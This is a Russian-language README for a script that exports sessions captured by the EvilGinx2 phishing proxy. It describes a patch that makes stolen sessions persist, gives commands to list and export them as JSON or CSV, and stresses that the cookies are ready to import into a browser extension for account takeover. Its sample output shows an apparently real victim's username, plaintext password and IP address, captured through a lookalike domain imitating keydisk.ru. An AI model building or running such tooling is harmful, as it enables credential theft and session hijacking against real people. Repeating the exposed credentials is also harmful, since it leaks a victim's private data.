# EvilGinx2 Session Export Tool

Эта утилита позволяет экспортировать сохраненные сессии из базы данных EvilGinx2 в том же формате, что и оригинальное приложение.

## Исправленная проблема

❌ **Была проблема**: Сессии отображались в интерфейсе EvilGinx2, но не сохранялись в `/root/evilginx2-data/data.db`

✅ **Решено**: 
- Добавлены вызовы `db.Flush()` в исходный код EvilGinx2
- Все сессии теперь автоматически сохраняются в базу данных
- Данные сохраняются после перезапуска

## Использование

### 1. Быстрый просмотр всех сессий (таблица)
```bash
evilginx-sessions
# или
evilginx-sessions list
```

### 2. Детальный просмотр конкретной сессии
```bash
evilginx-sessions 2
```
Выводит точно в том же формате, что и `sessions 2` в EvilGinx2:
```
 id           : 2
 phishlet     : keydisk-portal
 username     : vysotskiy_dv
 password     : 80Vfk"ynRbyCtk
 tokens       : captured
 landing url  : https://portal.keydlsk.ru/auth
 user-agent   : Mozilla/5.0 (...)
 remote ip    : 109.225.41.64
 create time  : 2025-09-24 17:05
 update time  : 2025-09-24 17:05

[ cookies ]
[{"path":"/","domain":"portal.keydisk.ru",...}]
```

### 3. Показать все сессии с деталями
```bash
evilginx-sessions show
```

### 4. Экспорт в различных форматах
```bash
# JSON формат
evilginx-sessions export 2 json

# CSV формат  
evilginx-sessions export all csv

# Только таблица
evilginx-sessions export all table
```

## Файлы

- **База данных**: `/root/evilginx2-data/data.db`
- **Скрипт экспорта**: `/root/evilginx2-data/export_sessions.sh`
- **Глобальные команды**: 
  - `/usr/local/bin/evilginx-sessions` (удобная команда)
  - `/usr/local/bin/evilginx-export` (прямой экспорт)

## Мониторинг

Проверка размера базы данных:
```bash
ls -la /root/evilginx2-data/data.db
```

Если размер > 0 байт - сессии сохраняются правильно.

## Примечания

1. **Cookies готовы к импорту**: JSON формат cookies полностью совместим с StorageAce extension
2. **Автоматическое сохранение**: Все новые сессии автоматически сохраняются в базу
3. **Персистентность**: Данные сохраняются после перезапуска EvilGinx2
4. **Точный формат**: Вывод идентичен оригинальному EvilGinx2

## Поддержка

Все инструменты созданы для корректной работы с базой данных BuntDB, которую использует EvilGinx2 версии 3.3.0.
